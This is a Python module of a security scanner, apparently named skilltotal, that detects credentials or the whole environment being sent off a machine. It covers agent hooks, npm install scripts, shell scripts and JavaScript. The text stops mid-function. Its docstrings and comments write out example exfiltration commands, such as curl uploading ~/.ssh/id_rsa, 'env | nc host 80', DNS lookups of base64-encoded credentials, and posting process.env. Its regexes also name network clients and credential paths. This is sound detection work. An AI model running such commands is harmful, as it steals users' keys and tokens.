"""Credentials, or the whole environment, sent off the machine by one command or call.

``ST-COMBO-EXFIL`` notices that a component can read a credential somewhere and can reach the
network somewhere. This rule is the narrower, stronger case: a single construct does both.

* **A command an agent or editor runs on its own** (``skilltotal.autorun``: hooks, MCP server
  launch commands, status line and credential helpers, plugin monitors and language servers,
  frontmatter hooks) that reads a credential and hands it to a network client: ``curl -d
  @~/.ssh/id_rsa https://...``, ``cat ~/.aws/credentials | curl --data-binary @- ...``, ``env |
  nc host 80``, ``$(gh auth token)`` sent to a host that is not GitHub. The example on the MCP
  security best-practices page (a client configuration whose startup command is ``npx ... && curl
  -X POST -d @~/.ssh/id_rsa ...``) is exactly this. A credential handed to its own client is not
  sent anywhere (``ssh -i ~/.ssh/key``, ``--kubeconfig``, a container mount ``-v ~/.aws:...``), and
  a provider's token sent to that provider (``gh auth token`` to ``api.github.com``) is its use.
* **An npm install-time script** (``preinstall``, ``install``, ``postinstall``, the prepare family
  and ``prepack``: ``loaded_code.NPM_LIFECYCLE_SCRIPTS``) that does the same, inline or through a
  shell script it runs or reaches through another file (``postinstall`` -> ``setup.js`` ->
  ``payload.sh``), and a JavaScript install script that writes a named login token into the
  address of a host that is not the token's own service.
* **A shell script one of those runs that collects first and sends later**: a line that writes a
  credential, the environment or a login token to a file or variable (``cat ~/.aws/credentials >>
  "$out"``), and a later line in which a network client uploads it (``curl --data-binary
  @"$out" ...``), the shape of the November 2026 CI and install-time stealers.
* **A command the component gives an agent or a person to run**: a shell script in a skill's
  folder or one an instruction file names (``Run `scripts/setup.sh` once``), a git hook file
  (``pre-push`` in a folder ``core.hooksPath`` points at), a shell block of an instruction file
  (``SKILL.md``, a command file), and the command string of ``os.system`` / ``subprocess`` with a
  shell / ``child_process.exec``. Nothing runs these on its own, so each statement is judged by
  itself and the destination has to be someone else's (``secret_upload(..., strict=True)``).
* **A named provider token sent to a host that is not the provider**: ``curl -d
  "k=$ANTHROPIC_API_KEY" https://collect...`` in a credential-helper script, ``$GITHUB_TOKEN`` in
  a header to a host that is not GitHub. Only the names in ``_TOKEN_OWN_HOSTS`` and only a
  written-out host: any other variable sent to the component's own API says nothing.
* **Credentials archived first** (``tar czf F ~/.aws ~/.ssh``, then ``curl -F f=@F``), published
  with ``gh gist create``, or sent as the labels of DNS lookups after encoding.
* **Code that passes the whole process environment into a network request**: ``fetch(url, {body:
  JSON.stringify(process.env)})``, ``requests.post(url, json=dict(os.environ))``, directly or
  through a variable. The environment is where a machine keeps its tokens (CI secrets, cloud keys,
  ``NPM_TOKEN``), and posting all of it is the first thing dependency-confusion and install-time
  stealers do. One named variable sent as a header is ordinary API use and is not matched, nor is
  the environment handed to a child process or written to a local file, nor what a helper reads
  from it (``token = resolve_token(os.environ)``, ``resolveHost(process.env)``).
* **Python code that reads an agent client's MCP configuration and sends its contents**:
  ``~/.cursor/mcp.json``, ``claude_desktop_config.json`` and ``~/.claude.json`` hold the tokens of
  every server the user configured. Reading or rewriting one is what an installer does and is not
  matched; the contents reaching a network request is. The same flow from conversation
  transcripts (``~/.claude/projects``) is a review note: session-sharing tools do it on request.

Detection patterns below are string literals and parsing; nothing here runs or sends anything.
"""

from __future__ import annotations

import ast
import re
from bisect import bisect_right

from skilltotal.autorun import AutorunCommand, autorun_commands
from skilltotal.file_index import FileIndex, IndexedFile
from skilltotal.models import Capability, Evidence, Severity, ThreatClass
from skilltotal.scanners.base import (
    MAX_EVIDENCE_SCANNED,
    RuleSpec,
    Scanner,
    ScanResult,
    _finding_from_rule,
    aggregated_review,
)
from skilltotal.scanners.dns_exfil import dns_secret_lookups
from skilltotal.scanners.install_scripts import (
    _NPM_LIFECYCLE_SCRIPTS,
    install_run_interpreters,
    npm_install_commands,
)
from skilltotal.scanners.python_ast import SHELL_CALLS, _shell_command_text
from skilltotal.scanners.sensitive_paths import _STRONG_PATHS
from skilltotal.scanners.shell_exec import _call_end, _string_literals, exec_call_pattern
from skilltotal.scanners.skill_fetch_exec import _INSTRUCTION_FILE

RULE_ID = "ST-SECRET-EXFIL"
# The note for a JavaScript file the environment-send check stopped short in (models.UNANALYZED).
ENV_SEND_PARTLY_READ = "Environment sends partly analyzed"

# --- commands -------------------------------------------------------------------------------------
# The home directory written as a variable reads as `~`, so `$HOME/.npmrc` is `~/.npmrc`.
_HOME = re.compile(
    r"\$\{?HOME\}?|\$\{?USERPROFILE\}?|\$env:(?:HOME|USERPROFILE)\b|%USERPROFILE%|%HOMEPATH%",
    re.IGNORECASE,
)
# A program that sends data over the network, at the start of a command or a pipeline stage.
_NET_CLIENT = re.compile(
    r"(?:^|[\s;&|(`'\"])(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|socat|telnet|ftp|tftp|scp|sftp|"
    r"rsync|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)(?=$|[\s;&|)`'\"])",
    re.IGNORECASE,
)
# The same from inline code (`node -e "..."`, `python -c "..."`, PowerShell).
_INLINE_NET = re.compile(
    r"\bfetch\s*\(|\bhttps?\.(?:request|get)\s*\(|\baxios\b|\bXMLHttpRequest\b|\burlopen\s*\(|"
    r"\brequests\.(?:post|put|patch|get)\s*\(|\bhttpx\.\w+\s*\(|Net\.WebClient|"
    r"\bUpload(?:String|File|Data)\s*\(|\bsendBeacon\s*\(",
    re.IGNORECASE,
)
# Commands that print a login token. Sent to that provider's own hosts, the token is being used.
_TOKEN_COMMANDS = (
    (re.compile(r"\bgh\s+auth\s+token\b"), ("github.com", "githubusercontent.com")),
    (re.compile(r"\bgcloud\s+auth\s+print-(?:access|identity)-token\b"),
     ("googleapis.com", "google.com")),
    (re.compile(r"\baz\s+account\s+get-access-token\b"),
     ("azure.com", "microsoft.com", "windows.net", "azure.net", "microsoftonline.com")),
    (re.compile(r"\bsecurity\s+find-(?:generic|internet)-password\b"), ()),
)
# The whole environment: `env` / `printenv` with no command after them, `/proc/self/environ`,
# PowerShell's `Env:` drive, and the same in inline code.
_ENV_DUMP = re.compile(
    r"(?:^|[\s;&|(`'\"])(?:printenv|env)\s*(?=$|[|;&)`'\">])"
    r"|/proc/(?:self|\d+)/environ\b"
    r"|\b(?:Get-ChildItem|gci|dir|ls)\s+env:"
    r"|\[(?:System\.)?Environment\]::GetEnvironmentVariables\(\s*\)"
    r"|JSON\.stringify\(\s*process\.env\s*\)"
    r"|\b(?:dict|str|repr)\(\s*os\.environ\s*\)",
    re.IGNORECASE,
)


def _env_dump(text: str) -> re.Match[str] | None:
    """The first environment dump in ``text`` that is a command and not a word of a message.

    ``env`` just before a ``)`` is the end of a subshell or a command substitution (``$(env)``,
    ``(cd /; env)``). Inside a double-quoted string only ``$(`` starts one; a bare ``(`` there is
    a bracket of the message: ``echo "... (restore it from the container's env)"``.
    """
    for m in _ENV_DUMP.finditer(text):
        if text[m.end():m.end() + 1] != ")":
            return m
        depth = 0
        opener = -1
        for i in range(m.start(), -1, -1):
            ch = text[i]
            if ch == ")":
                depth += 1
            elif ch == "(":
                if depth == 0:
                    opener = i
                    break
                depth -= 1
        if opener < 0 or text[opener - 1:opener] == "$":
            return m
        line_start = text.rfind("\n", 0, opener) + 1
        if text.count('"', line_start, opener) % 2 == 0:
            return m  # not inside a double-quoted string: a subshell
    return None


# A credential handed to its own client, a container mount or a tool's config option: read
# locally to authenticate, not sent anywhere. Checked on the text of the command stage before
# the path (the shapes sensitive_paths also treats as not a read).
_HANDED_TO_CLIENT = re.compile(
    r"(?:(?<![\w-])-i\s*=?\s*|\bIdentityFile[=\s]+|--identity(?:-file)?[=\s]+|\bssh-add\s+|"
    r"\bssh-keygen\b[^|;&\n]*\s-f\s*|--kubeconfig[=\s]+|\bKUBECONFIG=|"
    r"\b(?:AWS_SHARED_CREDENTIALS_FILE|AWS_CONFIG_FILE|GOOGLE_APPLICATION_CREDENTIALS|"
    r"SSH_KEY(?:_PATH)?|GIT_SSH_KEY)=|(?<![\w-])-v\s+|--volume[=\s]+|"
    r"--mount[=\s]+\S*?(?:source|src)=|--(?:cert|key|cacert|capath|netrc-file)[=\s]+|"
    r"(?<![\w-])-E\s+|\b(?:mkdir|chmod|chown|test)\b[^|;&\n]*|\[\[?\s+(?:!\s+)?-[A-Za-z]\s+|"
    # The file a download or a command's output is written to: `curl -o ~/.kube/config URL`,
    # `wget -O ~/.npmrc URL`, `... > ~/.aws/credentials`, `... | tee ~/.npmrc`.
    r"(?<![\w-])-[A-Za-z]{0,6}[oO]\s+|--output(?:-document)?[=\s]+|(?<![0-9&<])>>?\s*|"
    r"\btee\s+(?:-a\s+)?)"
    r"[\"']?[^\s\"'|;&]*$"
)
_STAGE_BREAK = re.compile(r"[;&|\n]|\$\(|`")
_URL_HOST = re.compile(r"https?://([^/\s\"'`:?#]+)", re.IGNORECASE)
# A machine's stored logins that the sensitive-path list leaves out (libraries read `~/.netrc`
# on their own all the time), but that a command uploading it sends all the same.
_NETRC = re.compile(r"~/\.netrc\b|(?<![\w.-])_netrc\b", re.IGNORECASE)
# `scp host:backup/id_rsa ~/.ssh/id_rsa`: the last word of a copy from a remote is where the file
# is written, not what is sent.
_COPIED_FROM_REMOTE = re.compile(
    r"\b(?:scp|rsync|sftp)\b[^|;&\n]{0,300}?\s[\w.@-]+:[^\s|;&]*\s+(?:[\"']?[^\s\"'|;&]+[\"']?\s+)*"
    r"[\"']?[^\s\"'|;&]*$"
)
_STAGE_END = re.compile(r"[^\s\"'|;&]*[\"']?\s*(?=$|[|;&\n)])")
_REMOTE_SIDE = re.compile(
    r"\b(?:scp|rsync|sftp)\b[^|;&\n]{0,300}?\s[\"']?[\w.@-]+:(?!//)[^\s\"']*$"
)
# A file that holds a login token, read into a request's own auth header or user option: the
# token is being used with a service (`curl -H "X-Vault-Token: $(cat ~/.vault-token)" ...`). A
# private key or a cloud credentials file has no such use.
_TOKEN_FILE = re.compile(
    r"\.vault-token|huggingface/token|\.config/gh/hosts\.yml|\.config/gcloud|\.netrc"
    r"|\.claude/\.credentials\.json|\.codex/auth\.json|\.gemini/oauth_creds\.json"
    r"|github-copilot/|\.azure",
    re.IGNORECASE,
)
_IN_AUTH_OPTION = re.compile(
    r"(?:(?<![\w-])-H|--header|(?<![\w-])-u|--user|--oauth2-bearer|-Headers)(?:\s+|=)"
    r"[\"']?[^\"'\n]{0,300}$"
)
# The host of each address, with `user:password@` left out.
_ADDRESS_HOST = re.compile(r"https?://(?:[^\s/?#@'\"`]*@)?([^\s/?#:'\"`]+)", re.IGNORECASE)


def _loopback(host: str) -> bool:
    # A host name is compared here; nothing binds to it (the reason for the nosec below).
    return host in ("localhost", "0.0.0.0", "[", "[::1]") or host.startswith("127.")  # nosec B104
# The instance-metadata address reads credentials only when asked for them; how that is sent on
# is a different question, left to the sensitive-path rule and the combination.
_METADATA = re.compile(r"169\.254\.169\.254")


_STAGE_WINDOW = 300


def _stage_before(text: str, at: int) -> str:
    """The text of the command stage (pipeline element, list element) up to offset ``at``, at
    most the last few hundred characters of it (bounded, so many paths stay linear)."""
    start = max(0, at - _STAGE_WINDOW)
    for m in _STAGE_BREAK.finditer(text, start, at):
        start = m.end()
    return text[start:at]


def _hosts(text: str) -> list[str]:
    return [m.group(1).lower() for m in _URL_HOST.finditer(text)]


# Two more ways a command sends a credential without an HTTP client. `gh gist create <file>`
# publishes the file. A DNS lookup of a name built from encoded data (`nslookup
# "$(cat ~/.aws/credentials | base64 | head -c 60).t.example.invalid"`) carries it to whoever
# runs the name server; the encoder is what tells that from a script resolving the hosts its
# SSH configuration lists.
_PUBLISHES_FILE = re.compile(r"(?:^|[\s;&|(`'\"])gh\s+gist\s+create\b")
_DNS_LOOKUP = re.compile(
    r"(?:^|[\s;&|(`'\"])(?:nslookup|dig|host)\s[^\n|;&]{0,300}?(?:\$\(|`|\$\{?\w)"
)
_ENCODES = re.compile(r"\b(?:base64|base32|xxd|hexdump|od\s+-)")


def _sends(text: str) -> bool:
    """True if the command runs something that can carry data off the machine."""
    return bool(
        _NET_CLIENT.search(text) or _INLINE_NET.search(text) or _PUBLISHES_FILE.search(text)
        or (_DNS_LOOKUP.search(text) and _ENCODES.search(text))
    )


def _may_send(text: str) -> bool:
    """A whole file's quick test: something in it can carry data off the machine."""
    return bool(
        _NET_CLIENT.search(text) or _INLINE_NET.search(text) or _PUBLISHES_FILE.search(text)
        or _DNS_LOOKUP.search(text)
    )


def _credential_paths(text: str) -> list[re.Match[str]]:
    """The credential locations written in ``text``, in order (the instance-metadata address is
    left to the sensitive-path rule)."""
    found = [m for m in _STRONG_PATHS.finditer(text) if not _METADATA.match(m.group(0))]
    if "netrc" in text:
        found = sorted([*found, *_NETRC.finditer(text)], key=lambda m: m.start())
    return found


def _not_sent(text: str, m: re.Match[str], strict: bool) -> bool:
    """True if the credential path ``m`` is not something the command sends: handed to its own
    client, written to (a download's output, the target of a copy from a remote), or, with
    ``strict``, a token file read into the request's own auth header."""
    before = _stage_before(text, m.start())
    if _HANDED_TO_CLIENT.search(before):
        return True
    if _COPIED_FROM_REMOTE.search(before) and _STAGE_END.match(text, m.end()):
        return True
    if _REMOTE_SIDE.search(before):
        return True  # `scp host:keys/id_rsa .`: a file on the other machine
    if not strict:
        return False
    word_end = _STAGE_END.match(text, m.start())
    word = text[m.start():word_end.end()] if word_end else m.group(0)
    return bool(
        _TOKEN_FILE.search(word)
        and _IN_AUTH_OPTION.search(text, max(0, m.start() - _STAGE_WINDOW), m.start())
    )


def secret_upload(command: str, env: str = "", *, strict: bool = False) -> tuple[int, int] | None:
    """The span (in ``command``) of a credential, a token command, a named provider token or an
    environment dump that the same command sends with a network client, or None.

    ``env`` holds the values the command is started with: a credential path handed over through
    one is read by the command as well, but only ``command`` can run a network client.

    ``strict`` is for a command that nothing runs on its own (a statement of a shell script the
    component ships, a command in an instruction file, a command string in code). There the
    destination has to be shown to be someone else's: a request to this machine is not an upload,
    a token file read into the request's own auth header is the token being used, and a token
    command counts only with a written-out host that is not the provider's.
    """
    text = _HOME.sub("~", command)
    if not _sends(text):
        return None
    if strict:
        hosts = [h.lower() for h in _ADDRESS_HOST.findall(text)]
        if hosts and all(_loopback(h) for h in hosts):
            return None
    for m in _credential_paths(text):
        if _not_sent(text, m, strict):
            continue
        return _original_span(command, text, m.start(), m.end())
    if env and _credential_paths(_HOME.sub("~", env)):
        hit = _NET_CLIENT.search(text) or _INLINE_NET.search(text)
        return _original_span(command, text, hit.start(), hit.end()) if hit else None
    m = _env_dump(text)
    if m:
        return _original_span(command, text, m.start(), m.end())
    for pattern, own_hosts in _TOKEN_COMMANDS:
        m = pattern.search(text)
        if m is None:
            continue
        hosts = _hosts(text)
        if own_hosts and hosts and all(h.endswith(own_hosts) for h in hosts):
            continue  # the provider's token sent to the provider: that is how it is used
        if strict and (not hosts or any("$" in h for h in hosts)):
            continue  # the destination is not written out: nothing shows it is someone else's
        return _original_span(command, text, m.start(), m.end())
    span = _named_token_sent(text)
    if span is not None:
        return _original_span(command, text, *span)
    return None


def _named_token_sent(text: str) -> tuple[int, int] | None:
    """The span of a named provider token (``$GITHUB_TOKEN``, ``$NPM_TOKEN``,
    ``$ANTHROPIC_API_KEY``: the names in ``_TOKEN_OWN_HOSTS``) that a network client sends to a
    written-out host that is not the token's own service.

    Any other variable (``$PDFHELPER_TOKEN`` sent to the component's own API) says nothing about
    whose it is and is not matched, nor is a request whose host is itself a variable. A model
    provider's key in an auth header is how a gateway or a compatible endpoint is called, so for
    those two keys only the key as data or in the address counts.
    """
    if "$" not in text or not _NET_CLIENT.search(text):
        return None
    hosts = [h.lower() for h in _ADDRESS_HOST.findall(text)]
    if not hosts or any("$" in h or "{" in h for h in hosts):
        return None
    hosts = [h for h in hosts if not _loopback(h)]
    if not hosts:
        return None
    for m in _TOKEN_VARIABLE.finditer(text):
        name = m.group(1)
        if any(_own_host(name, h) for h in hosts):
            continue
        if name in _GATEWAY_KEYS and _IN_AUTH_OPTION.search(
            text, max(0, m.start() - _STAGE_WINDOW), m.start()
        ):
            continue
        return m.start(), m.end()
    return None


def _original_span(original: str, normalized: str, start: int, end: int) -> tuple[int, int]:
    """Map a span of the home-normalized text back onto the original command (approximately:
    each replaced variable shortened the text before it)."""
    if original == normalized:
        return start, end
    shift = 0
    for m in _HOME.finditer(original):
        if m.start() - shift >= start:
            break
        shift += len(m.group(0)) - 1
    return start + shift, min(len(original), end + shift)


# --- code: the whole environment into a network request -------------------------------------------
_JS_SUFFIXES = (".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".mts", ".cts")
# `process.env` itself, not one of its variables (`process.env.X`, `process.env["X"]`).
_JS_WHOLE_ENV = re.compile(r"(?<![\w$.])process\.env(?!\s*(?:\?\.|\.)\s*[\w$]|\s*\[|[\w$])")
# A name followed by a property read (`env.TOKEN`, `env?.TOKEN`, `env['TOKEN']`): one variable of
# an environment alias, not the environment. A method call (`payload.toString()`) still carries it.
# `process.env` that is tested or listed, not passed on: `typeof process.env`, `Object.keys(
# process.env)` (the names only), `k in process.env`, `process.env && ...`, `process.env === x`,
# `process.env ? a : b`.
_JS_ENV_NOT_VALUE_BEFORE = re.compile(
    r"(?:\btypeof\s+|\bObject\s*\.\s*(?:keys|getOwnPropertyNames)\s*\(\s*|\bin\s+)$"
)
_JS_ENV_NOT_VALUE_AFTER = re.compile(r"\s*(?:[=!]==?|&&|\?(?!\.))")
# Bounded, and with no two whitespace runs side by side: `\s*(?:\?\.)?\s*\[` split one long run of
# blank lines every possible way, so `.match()` after a name followed by 40,000 newlines took 26 s.
_JS_MEMBER_READ = re.compile(
    r"\s{0,200}(?:(?:\?\.|\.)\s{0,200}[\w$]{1,200}(?![\w$])(?!\s{0,200}\()|(?:\?\.\s{0,200})?\[)"
)
_JS_SINK = re.compile(
    r"(?<![\w$.])(?:fetch|axios(?:\.(?:post|put|patch|request|get))?|got(?:\.(?:post|put|patch))?|"
    r"needle|ky(?:\.(?:post|put|patch))?|superagent\.(?:post|put|patch)|"
    r"(?:https?|http2)\.(?:request|get)|request(?:\.(?:post|put|patch))?|\$\.(?:post|ajax)|"
    r"navigator\.sendBeacon|undici\.request|ofetch)\s*\("
)
# `.send(` / `.write(` / `.end(` on a request or socket the same file opens.
_JS_SEND = re.compile(r"\.(?:send|write|end)\s*\(")
# The process's own output streams: a log line written there stays on the machine.
_JS_LOCAL_STREAM = re.compile(r"(?:\bprocess\s*\.\s*(?:stdout|stderr)|\bconsole)\s*$")
_JS_OPENS_CHANNEL = re.compile(
    r"\b(?:https?|http2)\.request\s*\(|\bnet\.(?:connect|createConnection)\s*\(|"
    r"\btls\.connect\s*\(|\bnew\s+(?:XMLHttpRequest|WebSocket)\s*\(|\bdgram\.createSocket\s*\("
)
# A shell command run from JavaScript with a network client in it.
_JS_EXEC = re.compile(r"(?<![\w$.])(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(")
_SHELL_NET = re.compile(r"\b(?:curl|wget|nc|ncat)\b")
_JS_DECLARED = re.compile(r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)")
_JS_ASSIGN = re.compile(
    r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=(?![=>])"
    r"|(?<![\w$.])([A-Za-z_$][\w$]*)(?:\s*\.\s*[A-Za-z_$][\w$]*|\[[^\]\n]{0,80}\])*\s*=(?![=>])"
)
_LOCAL_URL = re.compile(
    r"""^\s*['"`]https?://(?:localhost|127\.\d+\.\d+\.\d+|\[::1\]|0\.0\.0\.0)(?:[:/'"`]|$)"""
)
_ARGS_LIMIT = 4000
# Bounds for a crafted file (a real one has a handful of each).
_MAX_ENV_USES = 200
_MAX_TAINTED = 50
_MAX_CALLS = 2000
_ASSIGN_WINDOW = 800
_CONTINUATION = set("=+-*/%,(?:&|[{.!<>")
_CONTINUES_LINE = _CONTINUATION | {")", "]", "}"}


def _code_offset(f: IndexedFile, offset: int) -> bool:
    """True for code: not a comment, and not a string unless inside the ``${...}`` of a
    template literal (a command built as a template with the environment interpolated)."""
    if f.in_c_comment(offset):
        return False
    if not f.in_c_string(offset):
        return True
    span = f.string_span_at(offset)
    if span is None or f.text[span[0]] != "`":
        return False
    return f.text.rfind("${", span[0], offset) > f.text.rfind("}", span[0], offset)


def _skip_string(text: str, i: int, stop: int) -> int:
    quote = text[i]
    k = i + 1
    while k < stop:
        ch = text[k]
        if ch == "\\":
            k += 2
            continue
        if ch == quote:
            return k + 1
        if ch == "\n" and quote != "`":
            return k
        k += 1
    return stop


def _call_args(text: str, open_at: int) -> int | None:
    """Offset of the ``)`` closing the call whose ``(`` is at ``open_at`` (bounded), or None."""
    depth, i = 0, open_at
    stop = min(len(text), open_at + _ARGS_LIMIT)
    while i < stop:
        ch = text[i]
        if ch in "'\"`":
            i = _skip_string(text, i, stop)
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return None


def _same_statement(seg: str) -> bool:
    """True when nothing in ``seg`` (the text after an ``=``) ends the assignment's statement."""
    depth, i, n = 0, 0, len(seg)
    last = "="
    while i < n:
        ch = seg[i]
        if ch in "'\"`":
            i = _skip_string(seg, i, n)
            last = "x"
            continue
        if ch == "{" and (last == ")" or (last == ">" and seg[:i].rstrip().endswith("=>"))):
            # A function body: what it uses is not the value being assigned (a bundled module
            # `var require_x = __commonJS({ "x.js"(exports) { ... } })` is not its contents).
            return False
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
            if depth < 0:
                return False
        elif ch in ";," and depth == 0:
            return False  # the end of the statement, or of one declarator / parameter
        elif ch == "\n" and depth == 0:
            rest = seg[i + 1 :].lstrip()
            if last not in _CONTINUATION and rest and rest[0] not in _CONTINUES_LINE:
                return False
        if not ch.isspace():
            last = ch
        i += 1
    return True


def _assignment(
    text: str, pos: int, declared: frozenset[str] = frozenset(),
) -> tuple[str, int] | None:
    """The variable whose assignment statement holds offset ``pos``, and where that statement
    starts, if any.

    A parameter default (`function f(env = process.env)`) is not one: the name is local to a
    function, and every other function in the file may use the same name for something else. A
    property set on an object (`loot.env = process.env`) names the object only when the file
    declares it; a parameter or a module object (`exports.x = ...`) is not the code's payload.
    """
    start = max(0, pos - _ASSIGN_WINDOW)
    window = text[start:pos]
    last = None
    for m in _JS_ASSIGN.finditer(window):
        last = m
    if last is None or not _same_statement(window[last.end():]):
        return None
    if last.group(1):
        return last.group(1), start + last.start()
    if window[: last.start()].rstrip(" \t").endswith(("(", ",")):
        return None
    name = last.group(2)
    member = last.group(0)[len(name):].lstrip().startswith((".", "["))
    if member and name not in declared:
        return None
    return name, start + last.start()


_BRACE = re.compile(r"[{}]")


class _Blocks:
    """The ``{ ... }`` blocks of a file's code, to tell which block a statement is in.

    A name holds the environment only in the block where it was given it (with the blocks inside
    that one): a large bundle reuses short names (``env``, ``field``, ``parts``) in hundreds of
    unrelated functions, and following a name across the whole file joins them all up.
    """

    def __init__(self, f: IndexedFile) -> None:
        self.end = len(f.text)
        self.opens: list[int] = []
        self.closes: list[int] = []
        self.parent: list[int] = []
        stack: list[int] = []
        for m in _BRACE.finditer(f.text):
            at = m.start()
            if not _code_offset(f, at):
                continue
            if f.text[at] == "{":
                self.parent.append(stack[-1] if stack else -1)
                self.opens.append(at)
                self.closes.append(self.end)  # until its close is found
                stack.append(len(self.opens) - 1)
            elif stack:
                self.closes[stack.pop()] = at

    def around(self, pos: int) -> tuple[int, int]:
        """The innermost block holding ``pos`` (the whole file at the top level)."""
        i = bisect_right(self.opens, pos) - 1
        # The block opened last before pos holds it, or one of the blocks around that one does.
        while i >= 0 and self.closes[i] < pos:
            i = self.parent[i]
        return (self.opens[i], self.closes[i] + 1) if i >= 0 else (0, self.end)


def _options_start(text: str, start: int, end: int) -> int:
    """Where the last top-level argument of the call text[start:end] begins, when it is an object
    literal (a process call's options); ``end`` otherwise."""
    depth, i, last = 0, start, start
    while i < end:
        ch = text[i]
        if ch in "'\"`":
            i = _skip_string(text, i, end)
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif ch == "," and depth == 0:
            last = i + 1
        i += 1
    return last if text[last:end].lstrip().startswith("{") else end


def _first_arg_end(text: str, start: int, end: int) -> int:
    """Where the first top-level argument of the call text[start:end] ends."""
    depth, i = 0, start
    while i < end:
        ch = text[i]
        if ch in "'\"`":
            i = _skip_string(text, i, end)
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif ch == "," and depth == 0:
            return i
        i += 1
    return end


# Calls that put their argument into the request as it is: the environment passed through one
# of these into a URL is sent.
_JS_ENCODERS = frozenset({
    "stringify", "btoa", "from", "encodeURIComponent", "encodeURI", "escape", "toString",
    "URLSearchParams", "String", "entries", "keys", "values", "assign",
})
# A match starts only where a name starts, and both runs are bounded: searched over a long name (or
# a long run of spaces) before `(`, every later start position re-read the rest of it (quadratic).
_JS_CALLEE = re.compile(r"(?<![\w$])([A-Za-z_$][\w$]{0,200})\s{0,200}$")


def _config_lookup(text: str, start: int, pos: int) -> bool:
    """True if the environment at ``pos`` is an argument of a call (inside text[start:pos]) to a
    function of the code's own, such as ``chatCompletionsUrl(process.env)``: the environment is
    read there to build the address, not put into it. An encoder (``JSON.stringify``, ``btoa``)
    does put it in."""
    depth, i = 0, pos - 1
    while i >= start:
        ch = text[i]
        if ch in ")]}":
            depth += 1
        elif ch in "([{":
            if depth == 0:
                if ch != "(":
                    return False
                callee = _JS_CALLEE.search(text, start, i)
                return bool(callee) and callee.group(1) not in _JS_ENCODERS
            depth -= 1
        i -= 1
    return False


def _handed_to_helper(text: str, start: int, pos: int, own: frozenset[str]) -> bool:
    """True if the environment at ``pos`` is an argument (directly or inside an object or array
    literal) of a call in text[start:pos] to a function the file does not define and that is not
    an encoder: ``const host = resolveHost(process.env)``, ``resolveContext({env: process.env})``.
    What such a call returns is what it read from the environment (a host, a session, a key), not
    the environment. A function the file defines itself may hand it back, so it still counts."""
    depth, i = 0, pos - 1
    while i >= start:
        ch = text[i]
        if ch in ")]}":
            depth += 1
        elif ch in "([{":
            if depth == 0 and ch == "(":
                callee = _JS_CALLEE.search(text, start, i)
                if not callee:
                    return False
                name = callee.group(1)
                return name not in _JS_ENCODERS and name not in own
            if depth > 0:
                depth -= 1
        i -= 1
    return False


_JS_DEFINES = re.compile(
    r"\bfunction\s{0,20}\*?\s{0,20}([A-Za-z_$][\w$]{0,200})\s*\("
    r"|(?<![\w$.])([A-Za-z_$][\w$]{0,200})\s{0,20}[:=]\s{0,20}(?:async\s+)?"
    r"(?:function\b|\([^()]{0,200}\)\s{0,20}=>|[A-Za-z_$][\w$]{0,200}\s{0,20}=>)"
    r"|^[ \t]*(?:static\s+)?(?:async\s+)?([A-Za-z_$][\w$]{0,200})\s*\([^()\n]{0,200}\)\s*\{",
    re.MULTILINE,
)
_JS_NOT_A_NAME = frozenset({"if", "for", "while", "switch", "catch", "with", "return", "function"})


def _js_own_functions(text: str) -> frozenset[str]:
    return frozenset(
        name for m in _JS_DEFINES.finditer(text)
        for name in m.groups() if name and name not in _JS_NOT_A_NAME
    )


def _js_env_dumps(f: IndexedFile) -> list[Evidence]:
    return _js_env_sends(f)[0]


def _js_env_sends(f: IndexedFile) -> tuple[list[Evidence], bool]:
    """Calls in a JavaScript file that send the whole environment, and whether a bound for a
    crafted file stopped the search short (a file padded with uses or calls before the real one).
    """
    text = f.text
    if "process.env" not in text:
        return [], False
    whole = [
        m.start() for m in _JS_WHOLE_ENV.finditer(text)
        if _code_offset(f, m.start())
        and not _JS_ENV_NOT_VALUE_BEFORE.search(text, max(0, m.start() - 40), m.start())
        and not _JS_ENV_NOT_VALUE_AFTER.match(text, m.end())
    ]
    if not whole:
        return [], False
    # Every use counts where a call's arguments are checked (a sorted list, searched by bisect);
    # only the first ones are followed into the variables they are assigned to.
    truncated = len(whole) > _MAX_ENV_USES
    seeds = whole[:_MAX_ENV_USES]
    declared = frozenset(_JS_DECLARED.findall(text))
    own = _js_own_functions(text)
    blocks = _Blocks(f)

    def holder(pos: int) -> tuple[str, int] | None:
        """The variable assigned the environment (or a name holding it) at ``pos``, unless it
        is only given what a helper read from it."""
        found_at = _assignment(text, pos, declared)
        if found_at and _handed_to_helper(text, found_at[1], pos, own):
            return None
        return found_at

    # (name, the block it holds the environment in), in the order the source gives them (dicts
    # keep it; a set's order changes with each process's string hashing), so the cap below always
    # keeps the same ones.
    tainted: dict[tuple[str, tuple[int, int]], None] = {}
    for pos in seeds:
        found_at = holder(pos)
        if found_at:
            tainted[(found_at[0], blocks.around(found_at[1]))] = None
    for _ in range(3):  # a payload built in a few steps (env -> object -> JSON -> base64)
        grown: dict[tuple[str, tuple[int, int]], None] = {}
        for name, (start, end) in tainted:
            uses = re.compile(rf"(?<![\w$.]){re.escape(name)}(?![\w$])").finditer(text, start, end)
            for k, m in enumerate(uses):
                if k >= _MAX_ENV_USES:
                    break
                if not _code_offset(f, m.start()) or _JS_MEMBER_READ.match(text, m.end()):
                    continue
                found_at = holder(m.start())
                if found_at and found_at[0] != name:
                    key = (found_at[0], blocks.around(found_at[1]))
                    if key not in tainted:
                        grown[key] = None
            if len(tainted) + len(grown) >= _MAX_TAINTED:
                truncated = True
                break
        if not grown:
            break
        tainted.update(grown)
    scopes: dict[str, list[tuple[int, int]]] = {}
    for name, scope in tainted:
        scopes.setdefault(name, []).append(scope)
    names = re.compile(
        rf"(?<![\w$.])(?:{'|'.join(re.escape(n) for n in sorted(scopes))})(?![\w$])"
    ) if scopes else None
    opens_channel = bool(_JS_OPENS_CHANNEL.search(text))
    # Where the environment, or a name holding it, appears: a call whose arguments hold none of
    # these cannot send it, so it is skipped without counting against _MAX_CALLS.
    marks = sorted({*whole, *(m.start() for m in names.finditer(text))} if names else whole)

